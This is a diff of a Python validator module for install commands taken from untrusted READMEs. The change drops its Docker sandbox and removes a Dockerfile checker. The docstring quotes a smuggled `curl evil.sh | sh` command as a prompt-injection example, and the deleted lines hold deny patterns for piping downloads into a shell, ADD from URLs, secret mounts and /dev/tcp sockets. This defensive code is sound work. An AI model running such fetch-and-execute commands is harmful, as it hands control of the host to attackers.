@@ -1,9 +1,10 @@
 """Command validator — the prompt-injection defense.
 
-Install commands are derived from an UNTRUSTED README. A malicious repo can try to smuggle
-`curl evil.sh | sh` into the command we execute. Docker limits the blast radius,
-but the build step has network and runs arbitrary RUN lines — so every install
-command passes this allowlist before it is ever executed.
+Install commands are derived from an UNTRUSTED README. A malicious repo can try
+to smuggle `curl evil.sh | sh` into the command we execute. Nothing here runs in
+a container: an install lands on the engagement box itself, so this allowlist is
+*the* barrier rather than a second one behind a sandbox. Every install command
+passes it before it is ever executed.
 
 Rules:
   * allowed leading verb
@@ -36,8 +37,8 @@ ALLOWED_VERBS = (
     "yarn install", "yarn add", "bun install", "bun add",
     # rust / ruby / php
     "cargo install", "cargo build", "gem install", "composer install",
-    # containers + source
-    "docker build", "docker pull", "git clone",
+    # source
+    "git clone",
     # build + dependency steps that legitimately lead a recipe
     "make", "cmake", "apk add", "apt-get install", "apt-get update",
     "bash install.sh", "sh install.sh",
@@ -164,59 +165,12 @@ def validate_install(cmd: str, owner: str = "", repo: str = "") -> Result:
     return Result(True)
 
 
-# Base images a generated Dockerfile may start FROM. Pinning to
-# official images stops a repaired Dockerfile from pulling an arbitrary one.
-ALLOWED_BASES = ("golang", "python", "node", "rust", "alpine", "debian", "ubuntu",
-                 "busybox", "gcr.io/distroless/")
-
-# Fetch-execute and secret-exfiltration patterns inside RUN lines.
-DOCKERFILE_BAD = (
-    (re.compile(r"(curl|wget)[^\n|]*\|\s*(ba)?sh", re.I), "piping a download into a shell"),
-    (re.compile(r"^\s*ADD\s+https?://", re.I | re.M), "ADD from a URL"),
-    (re.compile(r"--mount=type=(secret|ssh)", re.I), "secret/ssh mount"),
-    (re.compile(r"/dev/tcp/"), "raw socket redirection"),
-    (re.compile(r"^\s*(COPY|ADD)\s+(?!--from=)", re.I | re.M), "COPY/ADD from a build "
-     "context (there is none — clone inside a RUN instead)"),
-)
-
-MAX_DOCKERFILE_LINES = 60
-
-
-def validate_dockerfile(text: str) -> Result:
-    """Gate a generated Dockerfile before it is built."""
-    df = (text or "").strip()
-    if not df:
-        return Result(False, "empty Dockerfile")
-    lines = [l for l in df.splitlines() if l.strip() and not l.strip().startswith("#")]
-    if not lines:
-        return Result(False, "Dockerfile has no instructions")
-    if len(lines) > MAX_DOCKERFILE_LINES:
-        return Result(False, f"Dockerfile too long ({len(lines)} instructions)")
-
-    first = lines[0].strip()
-    if not first.upper().startswith("FROM "):
-        return Result(False, f"Dockerfile must start with FROM (got {first[:40]!r})")
-
-    for line in lines:
-        if line.strip().upper().startswith("FROM "):
-            image = line.split(None, 1)[1].strip().split(" AS ")[0].strip().lower()
-            if not image.startswith(ALLOWED_BASES):
-                return Result(False, f"base image {image!r} is not an allowed official image")
-
-    for pat, why in DOCKERFILE_BAD:
-        if pat.search(df):
-            return Result(False, f"{why} not allowed in a Dockerfile")
-
-    return Result(True)
-
-
 def validate_command(command: str) -> Result:
     """Gate a free-form run command you typed.
 
     This is a usability guard more than a security one — the command runs as argv
-    inside the tool's container with no shell, so shell syntax wouldn't do what
-    you expect (a pipe would become a literal argument). Better to say so than to
-    silently misbehave.
+    with no shell, so shell syntax wouldn't do what you expect (a pipe would
+    become a literal argument). Better to say so than to silently misbehave.
     """
     t = (command or "").strip()
     if not t:
@@ -228,7 +182,7 @@ def validate_command(command: str) -> Result:
     for ch, why in FORBIDDEN_CHARS.items():
         if ch in t:
             return Result(False, f"{why} won't work here — the command runs "
-                                 "directly in the container with no shell")
+                                 "directly as argv with no shell")
     for pat, why in RUN_FORBIDDEN:
         if pat.search(t):
             return Result(False, f"{why} won't work here — no shell is involved")
@@ -239,7 +193,7 @@ MAX_INPUT_LINES = 100_000
 
 
 def validate_input(text: str) -> Result:
-    """Gate a pasted input list before it is written into the container.
+    """Gate a pasted input list before it is written to the run's scratch dir.
 
     It becomes a file, not part of the command, so shell metacharacters are
     harmless here — but a NUL byte truncates the file for any C program reading
